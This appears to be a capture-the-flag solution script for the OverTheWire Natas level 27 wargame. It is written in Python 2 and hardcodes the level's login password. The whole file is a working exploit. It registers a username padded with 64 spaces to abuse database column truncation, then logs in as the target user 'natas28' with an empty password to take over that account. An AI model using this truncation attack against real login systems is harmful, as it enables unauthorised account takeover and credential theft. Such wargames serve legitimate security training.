import requests

url = "http://natas27.natas.labs.overthewire.org"

user = "natas27"
pwd = "55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ"

# create user
data = {"username": "natas28" + " "*64 + "1", "password": ""}
r = requests.post(url, data=data, auth=(user,pwd))

# login
data = {"username": "natas28", "password": ""}
r = requests.post(url, data=data, auth=(user,pwd))
print r.content